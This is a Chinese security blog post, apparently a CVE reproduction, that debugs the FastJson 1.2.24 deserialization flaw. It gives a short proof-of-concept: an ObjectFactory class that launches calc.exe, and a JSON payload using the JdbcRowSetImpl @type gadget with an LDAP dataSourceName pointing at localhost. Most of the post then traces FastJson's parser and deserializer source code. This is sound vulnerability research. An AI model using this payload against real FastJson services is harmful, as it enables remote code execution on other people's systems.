@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>FastJson1.2.24调试记录_复现 | ccreaterのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="FastJson1.2.23 反序列化复现漏洞exp: 1234567891011121314151617public class Exploit implements ObjectFactory &amp;#123;    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson1.2.24调试记录_复现">
+<meta property="og:url" content="https://site.ccreater.top/2020/10/04/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="ccreaterのblog">
+<meta property="og:description" content="FastJson1.2.23 反序列化复现漏洞exp: 1234567891011121314151617public class Exploit implements ObjectFactory &amp;#123;    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-10-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-01T16:05:50.683Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="复现">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">ccreaterのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-FastJson1.2.24调试记录_复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/04/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="2020-10-04T16:00:00.000Z" itemprop="datePublished">2020-10-05</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      FastJson1.2.24调试记录_复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="FastJson1-2-23-反序列化复现"><a href="#FastJson1-2-23-反序列化复现" class="headerlink" title="FastJson1.2.23 反序列化复现"></a>FastJson1.2.23 反序列化复现</h1><p>漏洞exp:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;xterm&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FastJsonTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一步一步跟进去在<br>parseObject:320, DefaultJSONParser (com.alibaba.fastjson.parser)<br>发现了关于@type的处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, &#x27;&quot;&#x27;);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">    return deserializer.deserialze(this, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟下去观察到是通过<code>Thread.currentThread().getContextClassLoader().loadClass(className);</code><br>来加载@type的对应的值<br>跟进config.getDeserializer(clazz);<br>最后是通过<code>derializer = createJavaBeanDeserializer(clazz, type);</code>来生成反序列化处理器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) &#123;</span><br><span class="line">        boolean asmEnable = this.asmEnable;//不是安卓设备则为true</span><br><span class="line">        if (asmEnable) &#123;</span><br><span class="line">            JSONType jsonType = clazz.getAnnotation(JSONType.class);</span><br><span class="line"></span><br><span class="line">            if (jsonType != null) &#123;//检测是否存在JSONType注释</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (asmEnable) &#123;</span><br><span class="line">                Class&lt;?&gt; superClass = JavaBeanInfo.getBuilderClass(jsonType);//传入null</span><br><span class="line">                if (superClass == null) &#123;</span><br><span class="line">                    superClass = clazz;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                for (;;) &#123;//检查clazz及其所有父类是否均为public</span><br><span class="line">                    if (!Modifier.isPublic(superClass.getModifiers())) &#123;</span><br><span class="line">                        asmEnable = false;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    superClass = superClass.getSuperclass();</span><br><span class="line">                    if (superClass == Object.class || superClass == null) &#123;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (clazz.getTypeParameters().length != 0) &#123;//没有使用泛型</span><br><span class="line">            asmEnable = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable &amp;&amp; asmFactory != null &amp;&amp; asmFactory.classLoader.isExternalClass(clazz)) &#123;</span><br><span class="line">            asmEnable = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable) &#123;//类名不存在.和不可见字符</span><br><span class="line">            asmEnable = ASMUtils.checkName(clazz.getSimpleName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable) &#123;</span><br><span class="line">            if (clazz.isInterface()) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line">            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br><span class="line"></span><br><span class="line">            if (asmEnable &amp;&amp; beanInfo.fields.length &gt; 200) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;</span><br><span class="line">            if (asmEnable &amp;&amp; defaultConstructor == null &amp;&amp; !clazz.isInterface()) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable) &#123;</span><br><span class="line">            if (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!asmEnable) &#123;</span><br><span class="line">            return new JavaBeanDeserializer(this, clazz, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br><span class="line">        try &#123;</span><br><span class="line">            return asmFactory.createJavaBeanDeserializer(this, beanInfo);</span><br><span class="line">            // &#125; catch (VerifyError e) &#123;</span><br><span class="line">            // e.printStackTrace();</span><br><span class="line">            // return new JavaBeanDeserializer(this, clazz, type);</span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            return new JavaBeanDeserializer(this, clazz, type);</span><br><span class="line">        &#125; catch (JSONException asmError) &#123;</span><br><span class="line">            return new JavaBeanDeserializer(this, beanInfo);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new JSONException(&quot;create asm deserializer error, &quot; + clazz.getName(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>阅读代码发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 不是安卓设备</span><br><span class="line">2. clazz是否存在JSONType注释</span><br><span class="line">3. clazz及其所有父类都是public</span><br><span class="line">4. clazz类的声明没有使用泛型</span><br><span class="line">5. clazz的类名不存在.</span><br></pre></td></tr></table></figure>
+<p>经过上述检查后进入<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) &#123;</span><br><span class="line">    JSONType jsonType = clazz.getAnnotation(JSONType.class);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; builderClass = getBuilderClass(jsonType);</span><br><span class="line"></span><br><span class="line">    Field[] declaredFields = clazz.getDeclaredFields();//获取所有字段</span><br><span class="line">    Method[] methods = clazz.getMethods();//获取所有public方法</span><br><span class="line"></span><br><span class="line">    Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);</span><br><span class="line">    Constructor&lt;?&gt; creatorConstructor = null;</span><br><span class="line">    Method buildMethod = null;</span><br><span class="line"></span><br><span class="line">    List&lt;FieldInfo&gt; fieldList = new ArrayList&lt;FieldInfo&gt;();</span><br><span class="line"></span><br><span class="line">    if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers()))) &#123;</span><br><span class="line">       ... </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (defaultConstructor != null) &#123;</span><br><span class="line">        TypeUtils.setAccessible(defaultConstructor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (builderClass != null) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (Method method : methods) &#123; //</span><br><span class="line">        int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        if (methodName.length() &lt; 4) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//方法名大于4</span><br><span class="line"></span><br><span class="line">        if (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//非静态方法</span><br><span class="line"></span><br><span class="line">        // support builder set</span><br><span class="line">        if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//返回值是void 或 clazz类</span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        if (types.length != 1) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//只有一个参数</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        if (!methodName.startsWith(&quot;set&quot;)) &#123; // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//方法名以set开头</span><br><span class="line"></span><br><span class="line">        char c3 = methodName.charAt(3);</span><br><span class="line"></span><br><span class="line">        String propertyName;</span><br><span class="line">        if (Character.isUpperCase(c3) //set后的第一个字符必须是大写或_或f</span><br><span class="line">            || c3 &gt; 512 // for unicode method name</span><br><span class="line">        ) //获得set方法对应的字段</span><br><span class="line">        &#123;</span><br><span class="line">            if (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(3));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (c3 == &#x27;_&#x27;) &#123;</span><br><span class="line">            propertyName = methodName.substring(4);</span><br><span class="line">        &#125; else if (c3 == &#x27;f&#x27;) &#123;</span><br><span class="line">            propertyName = methodName.substring(3);</span><br><span class="line">        &#125; else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123;</span><br><span class="line">            propertyName = TypeUtils.decapitalize(methodName.substring(3));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field field = TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line">        if (field == null &amp;&amp; types[0] == boolean.class) &#123;//字段不存在或是bool型</span><br><span class="line">            String isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);</span><br><span class="line">            field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                     annotation, fieldAnnotation, null));//添加到fieldList</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (Field field : clazz.getFields()) &#123; // 添加非静态字段</span><br><span class="line">        int modifiers = field.getModifiers();</span><br><span class="line">        if ((modifiers &amp; Modifier.STATIC) != 0) &#123;//不允许STATIC</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if((modifiers &amp; Modifier.FINAL) != 0) &#123;</span><br><span class="line">            Class&lt;?&gt; fieldType = field.getType();</span><br><span class="line">            boolean supportReadOnly = Map.class.isAssignableFrom(fieldType) </span><br><span class="line">                    || Collection.class.isAssignableFrom(fieldType)</span><br><span class="line">                    || AtomicLong.class.equals(fieldType) //</span><br><span class="line">                    || AtomicInteger.class.equals(fieldType) //</span><br><span class="line">                    || AtomicBoolean.class.equals(fieldType);</span><br><span class="line">            if (!supportReadOnly) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        boolean contains = false;</span><br><span class="line">        for (FieldInfo item : fieldList) &#123;</span><br><span class="line">            if (item.name.equals(field.getName())) &#123;</span><br><span class="line">                contains = true;</span><br><span class="line">                break; // 已经是 contains = true，无需继续遍历</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (contains) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;</span><br><span class="line">        String propertyName = field.getName();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        add(fieldList, new FieldInfo(propertyName, null, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, null,</span><br><span class="line">                                     fieldAnnotation, null));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (Method method : clazz.getMethods()) &#123; // getter methods</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        if (methodName.length() &lt; 4) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) &#123;</span><br><span class="line">            if (method.getParameterTypes().length != 0) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (Collection.class.isAssignableFrom(method.getReturnType()) //</span><br><span class="line">                || Map.class.isAssignableFrom(method.getReturnType()) //</span><br><span class="line">                || AtomicBoolean.class == method.getReturnType() //</span><br><span class="line">                || AtomicInteger.class == method.getReturnType() //</span><br><span class="line">                || AtomicLong.class == method.getReturnType() //</span><br><span class="line">            ) &#123;</span><br><span class="line">                String propertyName;</span><br><span class="line"></span><br><span class="line">                ...</span><br><span class="line">                </span><br><span class="line">                FieldInfo fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">                if (fieldInfo != null) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (propertyNamingStrategy != null) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>大致总结一下会将哪些字段添加到FieldList中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 存在public的set方法的字段（方法名的set后的第一个字符是大写或_）</span><br><span class="line">2. 非Static和Final的字段（是的话要满足某些条件）</span><br><span class="line">3. 返回值是满足某些条件的非静态get方法对应的字段</span><br></pre></td></tr></table></figure>
+<p>最后返回排序后的FieldList,生成deserializer<br>接着调用了<code>return deserializer.deserialze(this, clazz, fieldName);</code><br>在程序执行错误(成功弹出计算器后的报错信息)的时候下断点进入<code>parseField</code><br><code>@type</code>字典下的其他字段,会进入<br><code>boolean match = parseField(parser, key, object, type, fieldValues);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,</span><br><span class="line">                          Map&lt;String, Object&gt; fieldValues) &#123;</span><br><span class="line">    JSONLexer lexer = parser.lexer; // xxx</span><br><span class="line"></span><br><span class="line">    FieldDeserializer fieldDeserializer = smartMatch(key);//如果fieldList没有这个字段则返回null</span><br><span class="line"></span><br><span class="line">    final int mask = Feature.SupportNonPublicField.mask;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    lexer.nextTokenWithColon(fieldDeserializer.getFastMatchToken());</span><br><span class="line"></span><br><span class="line">    fieldDeserializer.parseField(parser, object, objectType, fieldValues);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在fieldList字段查找存在后进入<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p>
